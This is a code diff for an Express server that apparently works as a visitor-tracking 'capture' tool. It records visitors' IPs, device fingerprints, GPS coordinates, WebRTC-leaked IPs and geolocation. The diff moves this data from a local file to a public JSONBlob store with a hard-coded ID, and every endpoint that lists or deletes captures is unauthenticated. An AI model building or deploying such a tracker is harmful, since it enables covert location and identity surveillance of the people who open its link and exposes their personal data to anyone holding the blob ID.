@@ -1,22 +1,18 @@
 const express = require('express');
-const fs = require('fs');
-const path = require('path');
 const crypto = require('crypto');
+const path = require('path');
 
 const app = express();
 const PORT = Number(process.env.PORT) || 3000;
 const IS_VERCEL = !!process.env.VERCEL;
-const DATA_DIR = IS_VERCEL ? '/tmp/data' : path.join(__dirname, 'data');
-const DATA_FILE = path.join(DATA_DIR, 'captures.json');
+
+// JSONBlob serves as our synchronized cloud database
+const JSONBLOB_ID = '019ded62-da44-7ebb-9058-66ffbacaede6';
+const JSONBLOB_URL = `https://jsonblob.com/api/jsonBlob/${JSONBLOB_ID}`;
 
 app.use(express.json({ limit: '128kb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
-
-function ensureDataFile() {
-  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-  if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '[]\n', 'utf8');
-}
 
 function fallbackGeo() {
   return {
@@ -50,30 +46,36 @@ function normalizeCapture(entry) {
 
 let inMemoryCaptures = null;
 
-function readCaptures() {
+async function readCaptures() {
   if (IS_VERCEL && inMemoryCaptures !== null) {
     return inMemoryCaptures;
   }
   
-  ensureDataFile();
   try {
-    const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+    const response = await fetch(JSONBLOB_URL, { cache: 'no-store' });
+    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+    const parsed = await response.json();
     const captures = Array.isArray(parsed) ? parsed.map(normalizeCapture) : [];
     if (IS_VERCEL) inMemoryCaptures = captures;
     return captures;
-  } catch {
+  } catch (err) {
+    console.error('Failed to read from JSONBlob:', err);
     if (IS_VERCEL && inMemoryCaptures) return inMemoryCaptures;
     return [];
   }
 }
 
-function writeCaptures(captures) {
+async function writeCaptures(captures) {
   if (IS_VERCEL) inMemoryCaptures = captures;
-  ensureDataFile();
   try {
-    fs.writeFileSync(DATA_FILE, JSON.stringify(captures, null, 2), 'utf8');
+    const response = await fetch(JSONBLOB_URL, {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(captures)
+    });
+    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
   } catch (err) {
-    console.warn('Could not write to local filesystem:', err);
+    console.warn('Could not write to JSONBlob:', err);
   }
 }
 
@@ -178,8 +180,7 @@ async function resolveIPGeo(ip) {
   }
 }
 
-function createCapture(req, extra = {}) {
-  const captures = readCaptures();
+function createCapture(req, captures, extra = {}) {
   const clientIP = extra.ip || getClientIP(req);
   const fingerprint = extra.fingerprint || createFingerprint(req);
   const deviceId =
@@ -205,8 +206,9 @@ function createCapture(req, extra = {}) {
   };
 }
 
-app.get('/api/health', (req, res) => {
-  res.json({ status: 'ok', captures: readCaptures().length, time: new Date().toISOString() });
+app.get('/api/health', async (req, res) => {
+  const captures = await readCaptures();
+  res.json({ status: 'ok', captures: captures.length, time: new Date().toISOString() });
 });
 
 app.get('/api/client-info', async (req, res) => {
@@ -221,12 +223,12 @@ app.get('/api/client-info', async (req, res) => {
 });
 
 app.post('/api/capture', async (req, res) => {
-  const captures = readCaptures();
-  const entry = createCapture(req);
+  const captures = await readCaptures();
+  const entry = createCapture(req, captures);
   entry.ipGeo = await resolveIPGeo(entry.ip);
 
   captures.push(entry);
-  writeCaptures(captures);
+  await writeCaptures(captures);
 
   console.log(
     `[CAPTURE] ${entry.id} | Device: ${entry.deviceId} | IP: ${entry.ip} | Visit #${entry.visitCount} | GPS: ${entry.gps ? 'yes' : 'no'}`
@@ -235,8 +237,8 @@ app.post('/api/capture', async (req, res) => {
   res.json({ status: 'ok', id: entry.id });
 });
 
-app.post('/api/demo-capture', (req, res) => {
-  const captures = readCaptures();
+app.post('/api/demo-capture', async (req, res) => {
+  const captures = await readCaptures();
   const now = Date.now();
   const demoDeviceId = `demo_${crypto.randomBytes(4).toString('hex')}`;
   const cities = [
@@ -284,13 +286,13 @@ app.post('/api/demo-capture', (req, res) => {
   });
 
   captures.push(entry);
-  writeCaptures(captures);
+  await writeCaptures(captures);
 
   res.json({ status: 'ok', id: entry.id });
 });
 
-app.patch('/api/capture/:id', (req, res) => {
-  const captures = readCaptures();
+app.patch('/api/capture/:id', async (req, res) => {
+  const captures = await readCaptures();
   const entry = captures.find((capture) => capture.id === req.params.id);
   if (!entry) return res.status(404).json({ error: 'Capture not found' });
 
@@ -304,32 +306,32 @@ app.patch('/api/capture/:id', (req, res) => {
     entry.webrtcIPs = req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8);
   }
 
-  writeCaptures(captures);
+  await writeCaptures(captures);
   res.json({ status: 'updated' });
 });
 
-app.get('/api/captures', (req, res) => {
-  res.json(readCaptures());
+app.get('/api/captures', async (req, res) => {
+  res.json(await readCaptures());
 });
 
-app.delete('/api/captures', (req, res) => {
-  writeCaptures([]);
+app.delete('/api/captures', async (req, res) => {
+  await writeCaptures([]);
   res.json({ status: 'cleared' });
 });
 
-app.delete('/api/captures/:id', (req, res) => {
-  const before = readCaptures();
+app.delete('/api/captures/:id', async (req, res) => {
+  const before = await readCaptures();
   const captures = before.filter((capture) => capture.id !== req.params.id);
-  writeCaptures(captures);
+  await writeCaptures(captures);
 
   if (captures.length === before.length) return res.json({ status: 'already_deleted' });
   res.json({ status: 'deleted', deleted: before.length - captures.length });
 });
 
-app.delete('/api/devices/:deviceId', (req, res) => {
-  const before = readCaptures();
+app.delete('/api/devices/:deviceId', async (req, res) => {
+  const before = await readCaptures();
   const captures = before.filter((capture) => capture.deviceId !== req.params.deviceId);
-  writeCaptures(captures);
+  await writeCaptures(captures);
 
   if (captures.length === before.length) return res.json({ status: 'already_deleted' });
   res.json({ status: 'deleted', deleted: before.length - captures.length });
@@ -365,8 +367,6 @@ Dashboard:  http://localhost:${port}/dashboard
     process.exitCode = 1;
   });
 }
-
-ensureDataFile();
 
 if (!IS_VERCEL) {
   startServer(PORT);
